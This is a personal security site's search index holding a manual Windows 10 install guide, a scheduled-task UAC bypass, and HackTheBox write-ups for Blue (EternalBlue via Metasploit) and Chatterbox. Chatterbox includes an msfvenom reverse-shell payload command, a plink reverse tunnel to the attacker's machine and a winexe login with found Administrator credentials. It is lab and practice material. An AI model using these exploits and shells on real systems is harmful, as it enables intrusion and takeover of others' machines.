{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Main Page Writeups and Experiments","title":"Main Page"},{"location":"#main-page","text":"Writeups and Experiments","title":"Main Page"},{"location":"Advanced%20Misc/Windows/Building%20Windows%20PE/","text":"to do","title":"Building Windows PE"},{"location":"Advanced%20Misc/Windows/Installing%20Windows%20manually/","text":"Get a USB flash drive and download the Windows 10 ISO. This can be done by going to https://www.microsoft.com/en-us/software-download/windows10 (You can use an agent-switcher if you don't want to use their tool) and getting the ISO. Go to https://rufus.ie/ for Windows users, for Linux users use WoeUSB, from https://github.com/slacka/WoeUSB. Download either Rufus or WoeUSB. For Rufus users, select your USB drive under \"Device.\" Then press \"SELECT\" and find your ISO file. Next hit \"START.\" For WoeUSB users, navigate to the ISO image from the program then select USB device and hit \"Install.\" After that is done, reboot your computer and boot the USB flash drive. (The boot menu can be F9, or many others so look up your device for more information). Now press Shift+F10 to bring up a terminal. Now is a good time to turn back if you don't know what you're doing! Type \"diskpart\" (without quotes) into the command prompt. Next I like to do a \"list disk\" so I can find what disk I want to install to. Type \"select disk X\" (replace X with your disk number found from list disk). Type \"clean\" THIS WILL WIPE YOUR DISK!!! Type \"convert gpt\" This converts your MBR drive to be a GPT drive. Type \"create part efi size=500\" This will make a partition that is 500MB. Type \"format fs=fat32 quick\" This will format your new partition to be fat32. Type \"assign letter w\" This assigns a drive letter to the efi partition. Type \"create part primary\" This is your primary partition. Windows will be installed to it. It will use the remainder of the disk. Type \"format fs=ntfs quick\" This makes your new partition NTFS. Type \"assign letter c\" In my case, this was already taken. If that happens to you, type \"list volume\" and see what drive has the c drive. After you find it type \"select volume X\" (replace X with volume number). Now type \"remove letter=C\" then after that, type \"select disk X\" and then \"select part 2\" Now you can type \"exit\" This closes diskpart. Type \"cd /d D:\\sources\" This drive letter could be different for you. For me it was F, for example. If that is the case for you, go back into diskpart and type \"list volume\" and find the correct letter (not C: or W:) Type \"dism /apply-image /imagefile:install.wim /index:1 /applydir:C:\\\" This might take a few minutes. Type \"bcdboot C:\\Windows /s W:\" This creates necessary boot files. Type \"regedit\" Now we are in the registry! Even though it might look very complicated, just follow my steps and you will be fine. Click on \"HKEY_LOCAL_MACHINE\" and then click file >> Load Hive... In File name: type \"C:\\windows\\system32\\config\" then press enter. Now select SOFTWARE then click open. Name it SOFT Go back into Load Hive and select SYSTEM then open, name it SYS. Now navigate to \"HKEY_LOCAL_MACHINE\\SOFT\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" Right click, New >> DWORD (32-bit) Value, name it \"VerboseStatus\" (Case sensitive). Double click it, switch it's value to 1. Double click \"EnableCursorSuppression\" Change the value to 0. Navigate to \"HKEY_LOCAL_MACHINE\\SYS\\Setup\" Double click \"CmdLine\" and change the text string to \"cmd.exe\" Close the Registry editor and then type \"wpeutil reboot\" to restart your computer. Wait for the setup to put a command prompt up then type \"oobe\\windeploy\" Wait for it to say \"Getting ready\" then type \"net user /add USERNAME\" (Yes, you can change USERNAME to whatever you want). Type \"net localgroup /add users USERNAME\" Type \"net localgroup /add administrators USERNAME\" Now type \"regedit\" You thought we were done with it ;) Now navigate to \"HKEY_LOCAL_MACHINE\\SYSTEM\\Setup\" Double click \"OOBEInProgress\" and change the value to 0. Change \"SetupType\" to 0. Change \"SystemSetupInProgress\" to 0. Close regedit and type exit. This part will vary for different people, for me it instantly came up with \"Choose privacy settings for your device\" but it can be different for you. If it says \"Please wait for the Windows Modules Installer\" Then wait for at least 5 minutes, then force reboot your computer by holding down the power button. It seems to never leave that screen. According to enderman it \"works most of the time.\" Choose your privacy settings then you're done! You have now successfully manually installed Windows 10! C: https://www.reddit.com/r/Windows10/comments/glaio4/how_to_manually_install_windows_10/","title":"Installing Windows manually"},{"location":"Security/Windows/Physical%20Access/Windows%20UAC%20Bypass/","text":"User Account Control is a mandatory access control enforcement feature introduced with Microsoft's Windows Vista and Windows Server 2008 operating systems, with a more relaxed version also present in Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012 and Windows 10. (Wikipedia) When User Account Control (UAC) is enabled, Windows prompts for consent or prompts for credentials of a valid local administrator account before starting a program or task that requires a full administrator access token. This prompt ensures that no malicious software can be silently installed or run. We can bypass this using a simple trick. In this example I will use regedit \u26a0 The method below can be used in situations where there is a direct access to the system either via RDP or physical. Creating the task Press WIN+R and open taskschd.msc , Schtasks bypasses the UAC when ran on highest privileges. It does not grant you free admin access but it skips the consent prompt. Right click on Tash Schedule Library and create a new folder, I will name it uac_bypass Now create a new task, name it however you want and set Run with highest privileges check. Now go in the Actions tab and create a new action, specify the action to be Start a program and select the program you want to launch. Select the newly created task and click Run Regedit will open without any UAC prompt.","title":"Windows UAC Bypass"},{"location":"Security/Windows/Physical%20Access/Windows%20UAC%20Bypass/#creating-the-task","text":"Press WIN+R and open taskschd.msc , Schtasks bypasses the UAC when ran on highest privileges. It does not grant you free admin access but it skips the consent prompt. Right click on Tash Schedule Library and create a new folder, I will name it uac_bypass Now create a new task, name it however you want and set Run with highest privileges check. Now go in the Actions tab and create a new action, specify the action to be Start a program and select the program you want to launch. Select the newly created task and click Run Regedit will open without any UAC prompt.","title":"Creating the task"},{"location":"Writeups/HackTheBox/Blue/","text":"This post will explain the root process of Blue on hackthebox using metasploit and without Running a simple nmap scan we can see quite a lot of ports open $ nmap -A -T4 -p- 10.10.10.40 We can see rpc, netbios and microsoft-ds On port 445 we can see SMB running, nmap tells us the box runs Windows 7 Professional SP1 and that the box is in a workgroup Nmap also ran some scripts for us which tells us the hostname and more useful information like if message_signing is enabled (which won't help us in this case, but it's a good thing to know) As the name suggest this box is probably vulnerable to ms17_010 which is Eternal Blue Metasploit way We can verify that the box is vulnerable using the use auxiliary/scanner/smb/smb_ms17_010 metasploit module and setting RHOSTS to 10.10.10.40 After verifying this box is vulnerable to eternal blue we can start exploiting it using metasploit's exploit/windows/smb/ms17_010_externalblue module, do not forget to set the host to 10.10.10.40 Looking at the options on the metasploit module we can see by default generic/shell_reverse_tcp which is an unstaged payload, it's also a generic shell and it won't result in a meterpreter shell. We could change it to windows/x64/meterpreter/reverse_tcp by changing payload using set . This will result in a meterpreter shell, making things easier. WARNING : This exploit might crash the target machine. After getting the meterpreter shell we can check using getuid that we are authority system. Manual way AutoBlue is a nice way to exploit eternal blue manually, it is located @ https://github.com/3ndG4me/autoblue-ms17-010 on github. (Just follow the instructions on the readme) WARNING : This exploit also might crash the target machine.","title":"Blue"},{"location":"Writeups/HackTheBox/Blue/#metasploit-way","text":"We can verify that the box is vulnerable using the use auxiliary/scanner/smb/smb_ms17_010 metasploit module and setting RHOSTS to 10.10.10.40 After verifying this box is vulnerable to eternal blue we can start exploiting it using metasploit's exploit/windows/smb/ms17_010_externalblue module, do not forget to set the host to 10.10.10.40 Looking at the options on the metasploit module we can see by default generic/shell_reverse_tcp which is an unstaged payload, it's also a generic shell and it won't result in a meterpreter shell. We could change it to windows/x64/meterpreter/reverse_tcp by changing payload using set . This will result in a meterpreter shell, making things easier. WARNING : This exploit might crash the target machine. After getting the meterpreter shell we can check using getuid that we are authority system.","title":"Metasploit way"},{"location":"Writeups/HackTheBox/Blue/#manual-way","text":"AutoBlue is a nice way to exploit eternal blue manually, it is located @ https://github.com/3ndG4me/autoblue-ms17-010 on github. (Just follow the instructions on the readme) WARNING : This exploit also might crash the target machine.","title":"Manual way"},{"location":"Writeups/HackTheBox/Chatterbox/","text":"In this post I will be showing you how to root Chatterbox, as always I will try to not spoonfeed as much as I can. Enjoy. I ran an nmap scan against the box but no ports came back, so I decided to a full port scan by adding the -p- flag my nmap command, this revealed 2 ports which were related to AChat. I did a quick searchsploit search against \"AChat\" and decided to use this python script: https://www.exploit-db.com/exploits/36025 I used the following command to generate my payload and replaced it in the python script msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=listeningip LPORT=listeningport -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python Then I used metasploit's exploit/multi/handler module to listen for the shell, do not forget to set the payload to windows/shell_reverse_tcp (I forgot doing this and it took me 30 minutes to figure it out) After I got the shell I ran really quick netstat -ano because I was not convinced AChat was the only service running on the machine. To my surprise, there was indeed 445 open which was basically SMB. SMB could help us only: - If we got credentials - In case of Administrator creds, we could possible get a shell - Anonymous login is enabled So before port forwarding 445, I decided to do more enumeration. I went to the good old hacktricks' checklist which I recommend you check out. After few minutes, I got my first credentials within registry, more info here: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry I downloaded plink ( MAKE SURE TO DOWNLOAD THE 32 BIT VERSION ) from here . After downloading it I used python3 to make a http server where I will download plink from. $ cd ~/Downloads $ python3 -m http.server # You might need to run this as root or specific another port that doesn't need special privs to bind to, by default it uses 8000 On my box I also started ssh using systemctl $ sudo systemctl enable ssh Then using plink on the box I ran the following: .\\plink.exe -l d4rckh -pw 123123 -R 445:127.0.0.1:445 10.10.XX.XX (NOTE: Change the username, IP and password so they match with your box) From there I ran winexe: winexe -U Administrator%Welcome1! //127.0.0.1 \u201ccmd.exe\u201d","title":"Chatterbox"}]}